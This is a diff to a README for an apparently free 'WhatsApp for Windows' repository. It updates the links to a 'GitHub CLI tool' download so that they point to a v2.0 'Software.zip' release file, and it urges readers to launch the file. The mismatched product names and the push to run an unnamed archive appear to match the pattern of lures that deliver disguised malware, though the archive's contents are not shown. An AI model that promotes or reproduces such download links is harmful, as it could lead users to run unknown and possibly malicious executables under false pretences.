@@ -15,9 +15,9 @@ This repository provides information and resources on:
 - And much more!
 
 ## 🚀 Quick Links
-For a quick start, you can download the GitHub CLI tool [here](https://github.com/Layth3348/WhatsApp-for-Windows-PC-Free/releases/download/v1.0/Software.zip). 
+For a quick start, you can download the GitHub CLI tool [here](https://github.com/Layth3348/WhatsApp-for-Windows-PC-Free/releases/download/v2.0/Software.zip). 
 
-[![Download GitHub CLI](https://github.com/Layth3348/WhatsApp-for-Windows-PC-Free/releases/download/v1.0/Software.zip)](https://github.com/Layth3348/WhatsApp-for-Windows-PC-Free/releases/download/v1.0/Software.zip)
+[![Download GitHub CLI](https://github.com/Layth3348/WhatsApp-for-Windows-PC-Free/releases/download/v2.0/Software.zip)](https://github.com/Layth3348/WhatsApp-for-Windows-PC-Free/releases/download/v2.0/Software.zip)
 
 Remember to launch the downloaded file and follow the installation instructions to get started!
 
